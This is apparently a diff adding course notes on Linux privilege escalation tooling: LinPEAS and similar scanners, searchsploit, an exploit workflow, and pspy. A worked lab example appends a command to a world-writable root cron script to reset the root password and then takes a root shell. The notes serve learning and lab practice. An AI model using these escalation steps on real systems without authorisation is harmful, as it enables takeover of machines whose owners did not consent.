@@ -1423,3 +1423,449 @@ showmount -e TARGET_IP
 * Inspect **cron jobs** for writable scripts, missing files, or weak configurations.
 * Review **NFS exports** for dangerous options such as `no_root_squash`.
 * Most successful privilege escalations come from **small configuration mistakes**, not dramatic software exploits. Careful enumeration is usually the deciding factor.
+---
+---
+# Linux Privilege Escalation: Automation
+
+## Overview
+
+Automation tools accelerate Linux privilege escalation by quickly identifying misconfigurations, vulnerable software, and hidden attack vectors. However, **automation is a force multiplier, not a replacement for manual enumeration**. Understanding the output remains essential for successful exploitation.
+
+---
+
+# Learning Objectives
+
+* Use automated privilege escalation enumeration tools.
+* Identify and exploit public privilege escalation vulnerabilities.
+* Monitor Linux processes using **pspy** to discover hidden privilege escalation opportunities.
+
+### Prerequisites
+
+* Linux Privilege Escalation: Enumeration
+* Linux Privilege Escalation: Basics
+
+---
+
+# Automated Enumeration Tools
+
+Enumeration tools help save time but **should never replace manual enumeration**, since they may miss important privilege escalation vectors.
+
+| Tool                              | Purpose                                                                                                                                  |
+| --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
+| **LinPEAS**                       | Comprehensive privilege escalation scanner highlighting weak permissions, credentials, misconfigurations, vulnerable software, and more. |
+| **LinEnum**                       | Collects system information, users, cron jobs, SUID binaries, services, and outputs a readable report.                                   |
+| **LES (Linux Exploit Suggester)** | Compares the system's kernel version against known CVEs and suggests possible kernel exploits.                                           |
+| **Linux Smart Enumeration (LSE)** | Multi-level enumeration tool with adjustable verbosity for progressive analysis.                                                         |
+| **Linux Priv Checker**            | Enumerates system information and flags common privilege escalation opportunities inline.                                                |
+
+### Important Consideration
+
+Choose tools compatible with the target system.
+
+Examples:
+
+* Python tools require Python.
+* Compiled binaries require matching CPU architecture.
+* Some systems may restrict scripting languages entirely.
+
+---
+
+# Public Exploits
+
+Unlike misconfigurations, **public exploits target software vulnerabilities**.
+
+These vulnerabilities receive **CVE (Common Vulnerabilities and Exposures)** identifiers.
+
+Examples include:
+
+* Buffer overflows
+* Race conditions
+* Logic flaws
+* Privilege escalation bugs
+
+Public exploit code is commonly available.
+
+---
+
+# Exploitation Methodology
+
+Successful exploitation follows a structured process.
+
+## 1. Enumerate
+
+Gather:
+
+* Kernel version
+* Linux distribution
+* Installed software versions
+* SUID binaries
+* Running services
+
+Useful commands:
+
+```bash
+uname -r
+uname -a
+cat /etc/os-release
+```
+
+---
+
+## 2. Research
+
+Search for known vulnerabilities.
+
+Useful resources:
+
+* searchsploit
+* GitHub
+* Google
+
+Typical search:
+
+```
+CVE-2024-XXXX github
+```
+
+---
+
+## 3. Evaluate
+
+Before running an exploit, verify:
+
+* Correct software version
+* Correct architecture
+* Required libraries
+* Compiler availability
+* Potential system instability
+
+Never blindly execute exploit code.
+
+---
+
+## 4. Exploit
+
+Transfer exploit to the target.
+
+Example:
+
+```bash
+scp exploit.c john@MACHINE_IP:/home/john/
+```
+
+Compile if necessary:
+
+```bash
+gcc exploit.c -o exploit
+```
+
+Run the exploit.
+
+---
+
+## 5. Verify
+
+Confirm elevated privileges.
+
+```bash
+whoami
+id
+```
+
+Attempt to access previously restricted files or commands.
+
+---
+
+# Finding Public Exploits
+
+## searchsploit (Exploit-DB)
+
+Pre-installed on Kali Linux.
+
+Usage:
+
+```bash
+searchsploit <software> <version>
+```
+
+---
+
+## GitHub
+
+Many CVE proof-of-concepts are hosted on GitHub.
+
+Typical search:
+
+```
+CVE-XXXX-XXXX github
+```
+
+---
+
+## Enumeration Tools
+
+Tools like LinPEAS often identify vulnerable software and include associated CVE numbers.
+
+---
+
+# Kernel Exploits
+
+Kernel vulnerabilities can immediately escalate privileges to root.
+
+Enumerate the kernel:
+
+```bash
+uname -r
+uname -a
+cat /etc/os-release
+```
+
+Search for matching CVEs using:
+
+* searchsploit
+* GitHub
+* Google
+
+---
+
+# Userland (Non-Kernel) Exploits
+
+Not all privilege escalation vulnerabilities affect the kernel.
+
+Common vulnerable software includes:
+
+* SUID programs
+* Privileged daemons
+* Root-owned services
+* Installed utilities
+
+These are often safer and easier to exploit than kernel vulnerabilities.
+
+---
+
+# Linux Process Snooping (pspy)
+
+Traditional enumeration tools only provide a **snapshot** of the system.
+
+They cannot reliably detect:
+
+* Short-lived cron jobs
+* Scheduled scripts
+* Temporary privileged processes
+
+---
+
+# What is pspy?
+
+**pspy** is a process monitoring tool that allows **unprivileged users** to observe processes executed by **other users**, including root.
+
+No root privileges are required.
+
+---
+
+# How pspy Works
+
+Instead of constantly polling, pspy uses an **event-driven approach**.
+
+It watches directories such as:
+
+* /etc
+* /tmp
+* /usr
+* /var
+
+When filesystem activity occurs, pspy immediately scans **/proc** and records:
+
+* UID
+* PID
+* Timestamp
+* Executed command
+
+Because process metadata briefly exists in `/proc`, pspy can capture even extremely short-lived root processes.
+
+---
+
+# Running pspy
+
+Example:
+
+```bash
+./pspy64
+```
+
+Sample output:
+
+```text
+UID=0 PID=1937 /bin/bash /root/run-backup.sh
+UID=0 PID=1938 tar -czf /var/backup/syslog.tar.gz
+UID=0 PID=1942 /bin/bash /usr/local/bin/rm-tmp.sh
+UID=0 PID=1946 chpasswd
+```
+
+This immediately reveals root-owned scripts that normal enumeration might miss.
+
+---
+
+# Investigating Discovered Scripts
+
+Example:
+
+```bash
+ls -la /usr/local/bin/rm-tmp.sh
+```
+
+Output:
+
+```text
+-rwxrwxrwx root root
+```
+
+View contents:
+
+```bash
+cat /usr/local/bin/rm-tmp.sh
+```
+
+Example:
+
+```bash
+#!/bin/bash
+
+rm -r /tmp/*
+```
+
+The script is:
+
+* Executed as root
+* World-writable
+
+This creates an excellent privilege escalation opportunity.
+
+---
+
+# Exploiting a Writable Root Script
+
+Append a command to reset the root password:
+
+```bash
+#!/bin/bash
+
+rm -r /tmp/*
+echo "root:newpass" | chpasswd
+```
+
+Wait for the scheduled execution, then switch to root:
+
+```bash
+su
+```
+
+Enter:
+
+```
+newpass
+```
+
+Result:
+
+```bash
+root@machine#
+```
+
+---
+
+# Key Takeaways
+
+## Automated Enumeration
+
+* Quickly identifies common privilege escalation vectors.
+* Saves significant enumeration time.
+* Should complement—not replace—manual investigation.
+
+---
+
+## Public Exploits
+
+Follow a structured workflow:
+
+1. Enumerate
+2. Research
+3. Evaluate
+4. Exploit
+5. Verify
+
+Never run exploit code without understanding it.
+
+---
+
+## pspy
+
+Excellent for discovering:
+
+* Hidden cron jobs
+* Root maintenance scripts
+* Temporary privileged processes
+* Background automation invisible to standard scanners
+
+---
+
+# Essential Commands
+
+### Automated Enumeration
+
+```bash
+linpeas.sh
+linenum.sh
+lse.sh
+linuxprivchecker.py
+```
+
+---
+
+### Kernel Enumeration
+
+```bash
+uname -r
+uname -a
+cat /etc/os-release
+```
+
+---
+
+### Search Exploit Database
+
+```bash
+searchsploit apache
+searchsploit linux kernel
+```
+
+---
+
+### Transfer Exploit
+
+```bash
+scp exploit.c john@MACHINE_IP:/home/john/
+```
+
+---
+
+### Process Monitoring
+
+```bash
+./pspy64
+```
+
+---
+
+### Verify Privileges
+
+```bash
+id
+whoami
+```
+
+---
+
+# Final Summary
+
+Linux privilege escalation automation enhances efficiency by combining **automated enumeration**, **public exploit research**, and **real-time process monitoring**. Tools like **LinPEAS** and **LSE** rapidly identify misconfigurations and vulnerable software, **searchsploit** and GitHub help locate applicable CVEs and proof-of-concept exploits, and **pspy** exposes transient root processes that traditional scanners cannot detect. Together, these tools significantly reduce manual effort, but they are most effective when paired with a solid understanding of Linux privilege escalation fundamentals and careful validation of every finding.
